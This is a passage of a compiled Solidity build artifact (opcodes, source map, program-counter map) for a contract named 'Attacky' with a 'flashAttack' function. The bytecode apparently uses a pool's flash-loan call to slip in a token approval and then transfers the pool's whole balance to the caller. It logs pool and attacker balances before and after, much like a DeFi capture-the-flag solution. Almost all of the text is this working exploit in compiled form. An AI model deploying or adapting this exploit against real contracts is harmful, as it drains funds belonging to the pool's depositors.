203:23;1228:67:14;1504:62;;;;;;;;;;;-1:-1:-1;;;1504:62:14;;;;1537:28;;-1:-1:-1;;;1537:28:14;;1554:10;1537:28;;;160:51:23;1504:62:14;;;1537:6;-1:-1:-1;;;;;1537:16:14;;;;133:18:23;;1537:28:14;14:203:23;1504:62:14;737:836;;;;699:874::o;5936:136:22:-;5997:71;6060:2;6064;6013:54;;;;;;;;;:::i;:::-;;;;-1:-1:-1;;6013:54:22;;;;;;;;;;;;;;-1:-1:-1;;;;;6013:54:22;-1:-1:-1;;;6013:54:22;;;5997:15;:71::i;:::-;5936:136;;:::o;176:288::-;264:14;;129:42;373:2;360:16;;240:21;;264:14;360:16;129:42;400:5;389:68;380:77;;335:126;;176:288;:::o;222:184:23:-;292:6;345:2;333:9;324:7;320:23;316:32;313:52;;;361:1;358;351:12;313:52;-1:-1:-1;384:16:23;;222:184;-1:-1:-1;222:184:23:o;690:422::-;731:3;769:5;763:12;796:6;791:3;784:19;821:1;831:162;845:6;842:1;839:13;831:162;;;907:4;963:13;;;959:22;;953:29;935:11;;;931:20;;924:59;860:12;831:162;;;835:3;1038:1;1031:4;1022:6;1017:3;1013:16;1009:27;1002:38;1101:4;1094:2;1090:7;1085:2;1077:6;1073:15;1069:29;1064:3;1060:39;1056:50;1049:57;;;690:422;;;;:::o;1117:488::-;1330:25;;;-1:-1:-1;;;;;1429:15:23;;;1424:2;1409:18;;1402:43;1481:15;;1476:2;1461:18;;1454:43;1533:3;1528:2;1513:18;;1506:31;;;1311:4;;1554:45;;1579:19;;1571:6;1554:45;:::i;:::-;1546:53;1117:488;-1:-1:-1;;;;;;1117:488:23:o;1990:277::-;2057:6;2110:2;2098:9;2089:7;2085:23;2081:32;2078:52;;;2126:1;2123;2116:12;2078:52;2158:9;2152:16;2211:5;2204:13;2197:21;2190:5;2187:32;2177:60;;2233:1;2230;2223:12;2177:60;2256:5;1990:277;-1:-1:-1;;;1990:277:23:o;2272:290::-;2449:2;2438:9;2431:21;2412:4;2469:44;2509:2;2498:9;2494:18;2486:6;2469:44;:::i;:::-;2461:52;;2549:6;2544:2;2533:9;2529:18;2522:34;2272:290;;;;;:::o",
  "language": "Solidity",
  "natspec": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "offset": [
    382,
    1576
  ],
  "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1755FF21 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xD0231578 EQ PUSH2 0x6A JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 SLOAD PUSH2 0x4E SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x72 PUSH2 0x74 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP1 DUP3 ADD DUP3 MSTORE PUSH1 0x15 DUP2 MSTORE PUSH21 0x2837B7B6103130B630B731B2902122A327A9229D1 PUSH1 0x5D SHL PUSH1 0x20 DUP3 ADD MSTORE SWAP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 DUP2 AND PUSH1 0x4 DUP4 ADD MSTORE PUSH2 0x155 SWAP3 SWAP2 PUSH32 0x0 SWAP1 SWAP2 AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x12C JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x150 SWAP2 SWAP1 PUSH2 0x58A JUMP JUMPDEST PUSH2 0x520 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 DUP2 AND PUSH1 0x4 DUP4 ADD MSTORE PUSH1 0x0 SWAP2 ADDRESS SWAP2 PUSH32 0x0 SWAP2 DUP5 SWAP2 DUP5 SWAP2 SWAP1 DUP5 AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1E7 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x20B SWAP2 SWAP1 PUSH2 0x58A JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND PUSH1 0x24 DUP4 ADD MSTORE PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH1 0x40 DUP1 MLOAD PUSH1 0x1F NOT DUP2 DUP5 SUB ADD DUP2 MSTORE SWAP2 DUP2 MSTORE PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB AND PUSH4 0x95EA7B3 PUSH1 0xE0 SHL OR SWAP1 MSTORE MLOAD PUSH4 0x3E5A95A3 PUSH1 0xE0 SHL DUP2 MSTORE SWAP1 SWAP2 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 AND SWAP1 PUSH4 0x3E5A95A3 SWAP1 PUSH2 0x2A3 SWAP1 DUP8 SWAP1 DUP8 SWAP1 DUP8 SWAP1 DUP8 SWAP1 PUSH1 0x4 ADD PUSH2 0x5E9 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x2BD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x2D1 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 DUP2 AND PUSH1 0x4 DUP5 ADD MSTORE PUSH32 0x0 AND SWAP4 POP PUSH4 0x23B872DD SWAP3 POP SWAP1 CALLER SWAP1 DUP5 SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x367 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x38B SWAP2 SWAP1 PUSH2 0x58A JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB NOT PUSH1 0xE0 DUP7 SWAP1 SHL AND DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP4 DUP5 AND PUSH1 0x4 DUP3 ADD MSTORE SWAP3 SWAP1 SWAP2 AND PUSH1 0x24 DUP4 ADD MSTORE PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x3DF JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x403 SWAP2 SWAP1 PUSH2 0x625 JUMP JUMPDEST POP PUSH1 0x40 DUP1 MLOAD DUP1 DUP3 ADD DUP3 MSTORE PUSH1 0x14 DUP2 MSTORE PUSH20 0x2837B7B6103130B630B731B29020A32A22A91D1 PUSH1 0x65 SHL PUSH1 0x20 DUP3 ADD MSTORE SWAP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 DUP2 AND PUSH1 0x4 DUP4 ADD MSTORE PUSH2 0x4A2 SWAP3 SWAP2 PUSH32 0x0 SWAP1 SWAP2 AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH2 0x10F JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP1 DUP3 ADD DUP3 MSTORE PUSH1 0x12 DUP2 MSTORE PUSH18 0x20BA3A30B1B5B2B9103130B630B731B29D1 PUSH1 0x75 SHL PUSH1 0x20 DUP3 ADD MSTORE SWAP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE CALLER PUSH1 0x4 DUP3 ADD MSTORE PUSH2 0x51A SWAP2 SWAP1 PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH2 0x10F JUMP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH2 0x565 DUP3 DUP3 PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH2 0x536 SWAP3 SWAP2 SWAP1 PUSH2 0x64E JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x1F NOT DUP2 DUP5 SUB ADD DUP2 MSTORE SWAP2 SWAP1 MSTORE PUSH1 0x20 DUP2 ADD DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB AND PUSH4 0x2D839CB3 PUSH1 0xE2 SHL OR SWAP1 MSTORE PUSH2 0x569 JUMP JUMPDEST POP POP JUMP JUMPDEST DUP1 MLOAD PUSH11 0x636F6E736F6C652E6C6F67 PUSH1 0x20 DUP4 ADD PUSH1 0x0 DUP1 DUP5 DUP4 DUP6 GAS STATICCALL POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x59C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD DUP1 DUP5 MSTORE PUSH1 0x0 JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 0x5C9 JUMPI PUSH1 0x20 DUP2 DUP6 ADD DUP2 ADD MLOAD DUP7 DUP4 ADD DUP3 ADD MSTORE ADD PUSH2 0x5AD JUMP JUMPDEST POP PUSH1 0x0 PUSH1 0x20 DUP3 DUP7 ADD ADD MSTORE PUSH1 0x20 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND DUP6 ADD ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST DUP5 DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 DUP2 AND PUSH1 0x20 DUP4 ADD MSTORE DUP4 AND PUSH1 0x40 DUP3 ADD MSTORE PUSH1 0x80 PUSH1 0x60 DUP3 ADD DUP2 SWAP1 MSTORE PUSH1 0x0 SWAP1 PUSH2 0x61B SWAP1 DUP4 ADD DUP5 PUSH2 0x5A3 JUMP JUMPDEST SWAP7 SWAP6 POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x637 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 MLOAD DUP1 ISZERO ISZERO DUP2 EQ PUSH2 0x647 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x40 DUP2 MSTORE PUSH1 0x0 PUSH2 0x661 PUSH1 0x40 DUP4 ADD DUP6 PUSH2 0x5A3 JUMP JUMPDEST SWAP1 POP DUP3 PUSH1 0x20 DUP4 ADD MSTORE SWAP4 SWAP3 POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xC2 DUP15 SELFBALANCE CALLVALUE 0xD5 0x21 EXTCODESIZE 0x24 SSTORE PUSH18 0x5F10309C8B01AE23EB927EACF5F1C37A528E 0x49 0xEE LOG0 CHAINID PUSH5 0x736F6C6343 STOP ADDMOD SGT STOP CALLER ",
  "pcMap": {
    "0": {
      "offset": [
        382,
        1576
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x80"
    },
    "2": {
      "fn": null,
      "offset": [
        382,
        1576
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x40"
    },
    "4": {
      "fn": null,
      "offset": [
        382,
        1576
      ],
      "op": "MSTORE",
      "path": "14"
    },
    "5": {
      "fn": null,
      "offset": [
        382,
        1576
      ],
      "op": "CALLVALUE",
      "path": "14"
    },
    "6": {
      "fn": null,
      "offset": [
        382,
        1576
      ],
      "op": "DUP1",
      "path": "14"
    },
    "7": {
      "fn": null,
      "offset": [
        382,
        1576
      ],
      "op": "ISZERO",
      "path": "14"
    },
    "8": {
      "fn": null,
      "offset": [
        382,
        1576
      ],
      "op": "PUSH2",
      "path": "14",
      "value": "0x10"
    },
    "11": {
      "fn": null,
      "offset": [
        382,
        1576
      ],
      "op": "JUMPI",
      "path": "14"
    },
    "12": {
      "fn": null,
      "offset": [
        382,
        1576
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x0"
    },
    "14": {
      "fn": null,
      "offset": [
        382,
        1576
      ],
      "op": "DUP1",
      "path": "14"
    },
    "15": {
      "dev": "Cannot send ether to nonpayable function",
      "fn": null,
      "offset": [
        382,
        1576
      ],
      "op": "REVERT",
      "path": "14"
    },
    "16": {
      "fn": null,
      "offset": [
        382,
        1576
      ],
      "op": "JUMPDEST",
      "path": "14"
    },
    "17": {
      "fn": null,
      "offset": [
        382,
        1576
      ],
      "op": "POP",
      "path": "14"
    },
    "18": {
      "fn": null,
      "offset": [
        382,
        1576
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x4"
    },
    "20": {
      "fn": null,
      "offset": [
        382,
        1576
      ],
      "op": "CALLDATASIZE",
      "path": "14"
    },
    "21": {
      "fn": null,
      "offset": [
        382,
        1576
      ],
      "op": "LT",
      "path": "14"
    },
    "22": {
      "fn": null,
      "offset": [
        382,
        1576
      ],
      "op": "PUSH2",
      "path": "14",
      "value": "0x36"
    },
    "25": {
      "fn": null,
      "offset": [
        382,
        1576
      ],
      "op": "JUMPI",
      "path": "14"
    },
    "26": {
      "fn": null,
      "offset": [
        382,
        1576
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x0"
    },
    "28": {
      "fn": null,
      "offset": [
        382,
        1576
      ],
      "op": "CALLDATALOAD",
      "path": "14"
    },
    "29": {
      "fn": null,
      "offset": [
        382,
        1576
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0xE0"
    },
    "31": {
      "fn": null,
      "offset": [
        382,
        1576
      ],
      "op": "SHR",
      "path": "14"
    },
    "32": {
      "fn": null,
      "offset": [
        382,
        1576
      ],
      "op": "DUP1",
      "path": "14"
    },
    "33": {
      "fn": null,
      "offset": [
        382,
        1576
      ],
      "op": "PUSH4",
      "path": "14",
      "value": "0x1755FF21"
    },
    "38": {
      "fn": null,
      "offset": [
        382,
        1576
      ],
      "op": "EQ",
      "path": "14"
    },
    "39": {
      "fn": null,
      "offset": [
        382,
        1576
      ],
      "op": "PUSH2",
      "path": "14",
      "value": "0x3B"
    },
    "42": {
      "fn": null,
      "offset": [
        382,
        1576
      ],
      "op": "JUMPI",
      "path": "14"
    },
    "43": {
      "fn": null,
      "offset": [
        382,
        1576
      ],
      "op": "DUP1",
      "path": "14"
    },
    "44": {
      "fn": null,
      "offset": [
        382,
        1576
      ],
      "op": "PUSH4",
      "path": "14",
      "value": "0xD0231578"
    },
    "49": {
      "fn": null,
      "offset": [
        382,
        1576
      ],
      "op": "EQ",
      "path": "14"
    },
    "50": {
      "fn": null,
      "offset": [
        382,
        1576
      ],
      "op": "PUSH2",
      "path": "14",
      "value": "0x6A"
    },
    "53": {
      "fn": null,
      "offset": [
        382,
        1576
      ],
      "op": "JUMPI",
      "path": "14"
    },
    "54": {
      "fn": null,
      "offset": [
        382,
        1576
      ],
      "op": "JUMPDEST",
      "path": "14"
    },
    "55": {
      "fn": null,
      "offset": [
        382,
        1576
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x0"
    },
    "57": {
      "fn": null,
      "offset": [
        382,
        1576
      ],
      "op": "DUP1",
      "path": "14"
    },
    "58": {
      "first_revert": true,
      "fn": null,
      "offset": [
        382,
        1576
      ],
      "op": "REVERT",
      "path": "14"
    },
    "59": {
      "offset": [
        493,
        519
      ],
      "op": "JUMPDEST",
      "path": "14"
    },
    "60": {
      "fn": null,
      "offset": [
        493,
        519
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x0"
    },
    "62": {
      "fn": null,
      "offset": [
        493,
        519
      ],
      "op": "SLOAD",
      "path": "14"
    },
    "63": {
      "fn": null,
      "offset": [
        493,
        519
      ],
      "op": "PUSH2",
      "path": "14",
      "value": "0x4E"
    },
    "66": {
      "fn": null,
      "offset": [
        493,
        519
      ],
      "op": "SWAP1",
      "path": "14"
    },
    "67": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "69": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "71": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "73": {
      "op": "SHL"
    },
    "74": {
      "op": "SUB"
    },
    "75": {
      "offset": [
        493,
        519
      ],
      "op": "AND",
      "path": "14"
    },
    "76": {
      "fn": null,
      "offset": [
        493,
        519
      ],
      "op": "DUP2",
      "path": "14"
    },
    "77": {
      "fn": null,
      "offset": [
        493,
        519
      ],
      "op": "JUMP",
      "path": "14"
    },
    "78": {
      "fn": null,
      "offset": [
        493,
        519
      ],
      "op": "JUMPDEST",
      "path": "14"
    },
    "79": {
      "fn": null,
      "offset": [
        493,
        519
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x40"
    },
    "81": {
      "fn": null,
      "offset": [
        493,
        519
      ],
      "op": "MLOAD",
      "path": "14"
    },
    "82": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "84": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "86": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "88": {
      "op": "SHL"
    },
    "89": {
      "op": "SUB"
    },
    "90": {
      "op": "SWAP1"
    },
    "91": {
      "op": "SWAP2"
    },
    "92": {
      "op": "AND"
    },
    "93": {
      "op": "DUP2"
    },
    "94": {
      "op": "MSTORE"
    },
    "95": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "97": {
      "op": "ADD"
    },
    "98": {
      "offset": [
        493,
        519
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x40"
    },
    "100": {
      "fn": null,
      "offset": [
        493,
        519
      ],
      "op": "MLOAD",
      "path": "14"
    },
    "101": {
      "fn": null,
      "offset": [
        493,
        519
      ],
      "op": "DUP1",
      "path": "14"
    },
    "102": {
      "fn": null,
      "offset": [
        493,
        519
      ],
      "op": "SWAP2",
      "path": "14"
    },
    "103": {
      "fn": null,
      "offset": [
        493,
        519
      ],
      "op": "SUB",
      "path": "14"
    },
    "104": {
      "fn": null,
      "offset": [
        493,
        519
      ],
      "op": "SWAP1",
      "path": "14"
    },
    "105": {
      "fn": null,
      "offset": [
        493,
        519
      ],
      "op": "RETURN",
      "path": "14"
    },
    "106": {
      "fn": "Attacky.flashAttack",
      "offset": [
        699,
        1573
      ],
      "op": "JUMPDEST",
      "path": "14"
    },
    "107": {
      "fn": "Attacky.flashAttack",
      "offset": [
        699,
        1573
      ],
      "op": "PUSH2",
      "path": "14",
      "value": "0x72"
    },
    "110": {
      "fn": "Attacky.flashAttack",
      "offset": [
        699,
        1573
      ],
      "op": "PUSH2",
      "path": "14",
      "value": "0x74"
    },
    "113": {
      "fn": "Attacky.flashAttack",
      "jump": "i",
      "offset": [
        699,
        1573
      ],
      "op": "JUMP",
      "path": "14"
    },
    "114": {
      "fn": "Attacky.flashAttack",
      "offset": [
        699,
        1573
      ],
      "op": "JUMPDEST",
      "path": "14"
    },
    "115": {
      "fn": "Attacky.flashAttack",
      "offset": [
        699,
        1573
      ],
      "op": "STOP",
      "path": "14"
    },
    "116": {
      "fn": "Attacky.flashAttack",
      "offset": [
        699,
        1573
      ],
      "op": "JUMPDEST",
      "path": "14"
    },
    "117": {
      "fn": "Attacky.flashAttack",
      "offset": [
        747,
        815
      ],
      "op": "PUSH1",
      "path": "14",
      "statement": 0,
      "value": "0x40"
    },
    "119": {
      "fn": "Attacky.flashAttack",
      "offset": [
        747,
        815
      ],
      "op": "DUP1",
      "path": "14"
    },
    "120": {
      "fn": "Attacky.flashAttack",
      "offset": [
        747,
        815
      ],
      "op": "MLOAD",
      "path": "14"
    },
    "121": {
      "fn": "Attacky.flashAttack",
      "offset": [
        747,
        815
      ],
      "op": "DUP1",
      "path": "14"
    },
    "122": {
      "fn": "Attacky.flashAttack",
      "offset": [
        747,
        815
      ],
      "op": "DUP3",
      "path": "14"
    },
    "123": {
      "fn": "Attacky.flashAttack",
      "offset": [
        747,
        815
      ],
      "op": "ADD",
      "path": "14"
    },
    "124": {
      "fn": "Attacky.flashAttack",
      "offset": [
        747,
        815
      ],
      "op": "DUP3",
      "path": "14"
    },
    "125": {
      "fn": "Attacky.flashAttack",
      "offset": [
        747,
        815
      ],
      "op": "MSTORE",
      "path": "14"
    },
    "126": {
      "fn": "Attacky.flashAttack",
      "offset": [
        747,
        815
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x15"
    },
    "128": {
      "fn": "Attacky.flashAttack",
      "offset": [
        747,
        815
      ],
      "op": "DUP2",
      "path": "14"
    },
    "129": {
      "fn": "Attacky.flashAttack",
      "offset": [
        747,
        815
      ],
      "op": "MSTORE",
      "path": "14"
    },
    "130": {
      "op": "PUSH21",
      "value": "0x2837B7B6103130B630B731B2902122A327A9229D1"
    },
    "152": {
      "op": "PUSH1",
      "value": "0x5D"
    },
    "154": {
      "op": "SHL"
    },
    "155": {
      "fn": "Attacky.flashAttack",
      "offset": [
        747,
        815
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x20"
    },
    "157": {
      "fn": "Attacky.flashAttack",
      "offset": [
        747,
        815
      ],
      "op": "DUP3",
      "path": "14"
    },
    "158": {
      "fn": "Attacky.flashAttack",
      "offset": [
        747,
        815
      ],
      "op": "ADD",
      "path": "14"
    },
    "159": {
      "fn": "Attacky.flashAttack",
      "offset": [
        747,
        815
      ],
      "op": "MSTORE",
      "path": "14"
    },
    "160": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "SWAP1",
      "path": "14"
    },
    "161": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "MLOAD",
      "path": "14"
    },
    "162": {
      "op": "PUSH4",
      "value": "0x70A08231"
    },
    "167": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "169": {
      "op": "SHL"
    },
    "170": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "DUP2",
      "path": "14"
    },
    "171": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "MSTORE",
      "path": "14"
    },
    "172": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "174": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "176": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "178": {
      "op": "SHL"
    },
    "179": {
      "op": "SUB"
    },
    "180": {
      "fn": "Attacky.flashAttack",
      "offset": [
        808,
        812
      ],
      "op": "PUSH32",
      "path": "14",
      "value": "0x0"
    },
    "213": {
      "op": "DUP2"
    },
    "214": {
      "op": "AND"
    },
    "215": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x4"
    },
    "217": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "DUP4",
      "path": "14"
    },
    "218": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "ADD",
      "path": "14"
    },
    "219": {
      "op": "MSTORE"
    },
    "220": {
      "fn": "Attacky.flashAttack",
      "offset": [
        747,
        815
      ],
      "op": "PUSH2",
      "path": "14",
      "value": "0x155"
    },
    "223": {
      "fn": "Attacky.flashAttack",
      "offset": [
        747,
        815
      ],
      "op": "SWAP3",
      "path": "14"
    },
    "224": {
      "fn": "Attacky.flashAttack",
      "offset": [
        747,
        815
      ],
      "op": "SWAP2",
      "path": "14"
    },
    "225": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        789
      ],
      "op": "PUSH32",
      "path": "14",
      "value": "0x0"
    },
    "258": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        799
      ],
      "op": "SWAP1",
      "path": "14"
    },
    "259": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        799
      ],
      "op": "SWAP2",
      "path": "14"
    },
    "260": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        799
      ],
      "op": "AND",
      "path": "14"
    },
    "261": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        799
      ],
      "op": "SWAP1",
      "path": "14"
    },
    "262": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        799
      ],
      "op": "PUSH4",
      "path": "14",
      "value": "0x70A08231"
    },
    "267": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        799
      ],
      "op": "SWAP1",
      "path": "14"
    },
    "268": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "270": {
      "op": "ADD"
    },
    "271": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "JUMPDEST",
      "path": "14"
    },
    "272": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x20"
    },
    "274": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x40"
    },
    "276": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "MLOAD",
      "path": "14"
    },
    "277": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "DUP1",
      "path": "14"
    },
    "278": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "DUP4",
      "path": "14"
    },
    "279": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "SUB",
      "path": "14"
    },
    "280": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "DUP2",
      "path": "14"
    },
    "281": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "DUP7",
      "path": "14"
    },
    "282": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "GAS",
      "path": "14"
    },
    "283": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "STATICCALL",
      "path": "14"
    },
    "284": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "ISZERO",
      "path": "14"
    },
    "285": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "DUP1",
      "path": "14"
    },
    "286": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "ISZERO",
      "path": "14"
    },
    "287": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "PUSH2",
      "path": "14",
      "value": "0x12C"
    },
    "290": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "JUMPI",
      "path": "14"
    },
    "291": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
